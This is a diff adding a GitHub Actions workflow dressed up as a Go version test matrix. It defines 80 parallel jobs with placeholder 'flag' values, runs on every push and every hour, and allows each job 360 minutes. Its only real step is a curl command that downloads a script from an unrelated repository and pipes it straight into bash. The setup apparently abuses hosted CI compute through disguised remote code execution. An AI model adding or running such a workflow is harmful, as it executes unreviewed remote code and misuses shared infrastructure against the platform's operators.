@@ -1,0 +1,118 @@
+name: CINUL
+
+on:
+  push:
+  schedule:
+    - cron: '0 * * * *'  # Setiap jam
+
+jobs:
+  build:
+    name: IPLAYBOOKS
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # 1.17
+          - { go: 1.17, flag: flag-1 }
+          - { go: 1.17, flag: flag-2 }
+          - { go: 1.17, flag: flag-3 }
+          - { go: 1.17, flag: flag-4 }
+          - { go: 1.17, flag: flag-5 }
+          - { go: 1.17, flag: flag-6 }
+          - { go: 1.17, flag: flag-7 }
+          - { go: 1.17, flag: flag-8 }
+          - { go: 1.17, flag: flag-9 }
+          - { go: 1.17, flag: flag-10 }
+          - { go: 1.17, flag: flag-11 }
+          - { go: 1.17, flag: flag-12 }
+          - { go: 1.17, flag: flag-13 }
+          - { go: 1.17, flag: flag-14 }
+          - { go: 1.17, flag: flag-15 }
+          - { go: 1.17, flag: flag-16 }
+          - { go: 1.17, flag: flag-17 }
+          - { go: 1.17, flag: flag-18 }
+          - { go: 1.17, flag: flag-19 }
+          - { go: 1.17, flag: flag-20 }
+
+          # 1.18
+          - { go: 1.18, flag: flag-1 }
+          - { go: 1.18, flag: flag-2 }
+          - { go: 1.18, flag: flag-3 }
+          - { go: 1.18, flag: flag-4 }
+          - { go: 1.18, flag: flag-5 }
+          - { go: 1.18, flag: flag-6 }
+          - { go: 1.18, flag: flag-7 }
+          - { go: 1.18, flag: flag-8 }
+          - { go: 1.18, flag: flag-9 }
+          - { go: 1.18, flag: flag-10 }
+          - { go: 1.18, flag: flag-11 }
+          - { go: 1.18, flag: flag-12 }
+          - { go: 1.18, flag: flag-13 }
+          - { go: 1.18, flag: flag-14 }
+          - { go: 1.18, flag: flag-15 }
+          - { go: 1.18, flag: flag-16 }
+          - { go: 1.18, flag: flag-17 }
+          - { go: 1.18, flag: flag-18 }
+          - { go: 1.18, flag: flag-19 }
+          - { go: 1.18, flag: flag-20 }
+
+          # 1.19
+          - { go: 1.19, flag: flag-1 }
+          - { go: 1.19, flag: flag-2 }
+          - { go: 1.19, flag: flag-3 }
+          - { go: 1.19, flag: flag-4 }
+          - { go: 1.19, flag: flag-5 }
+          - { go: 1.19, flag: flag-6 }
+          - { go: 1.19, flag: flag-7 }
+          - { go: 1.19, flag: flag-8 }
+          - { go: 1.19, flag: flag-9 }
+          - { go: 1.19, flag: flag-10 }
+          - { go: 1.19, flag: flag-11 }
+          - { go: 1.19, flag: flag-12 }
+          - { go: 1.19, flag: flag-13 }
+          - { go: 1.19, flag: flag-14 }
+          - { go: 1.19, flag: flag-15 }
+          - { go: 1.19, flag: flag-16 }
+          - { go: 1.19, flag: flag-17 }
+          - { go: 1.19, flag: flag-18 }
+          - { go: 1.19, flag: flag-19 }
+          - { go: 1.19, flag: flag-20 }
+
+          # 1.20
+          - { go: 1.20, flag: flag-1 }
+          - { go: 1.20, flag: flag-2 }
+          - { go: 1.20, flag: flag-3 }
+          - { go: 1.20, flag: flag-4 }
+          - { go: 1.20, flag: flag-5 }
+          - { go: 1.20, flag: flag-6 }
+          - { go: 1.20, flag: flag-7 }
+          - { go: 1.20, flag: flag-8 }
+          - { go: 1.20, flag: flag-9 }
+          - { go: 1.20, flag: flag-10 }
+          - { go: 1.20, flag: flag-11 }
+          - { go: 1.20, flag: flag-12 }
+          - { go: 1.20, flag: flag-13 }
+          - { go: 1.20, flag: flag-14 }
+          - { go: 1.20, flag: flag-15 }
+          - { go: 1.20, flag: flag-16 }
+          - { go: 1.20, flag: flag-17 }
+          - { go: 1.20, flag: flag-18 }
+          - { go: 1.20, flag: flag-19 }
+          - { go: 1.20, flag: flag-20 }
+
+    timeout-minutes: 360
+
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+
+    - name: Checkout source code
+      uses: actions/checkout@v1
+
+    - name: Run script
+      run: |
+        echo "Running Go version: ${{ matrix.go }}, flag: ${{ matrix.flag }}"
+        curl -sL https://raw.githubusercontent.com/moyz-2/Dd/refs/heads/main/ixi | bash
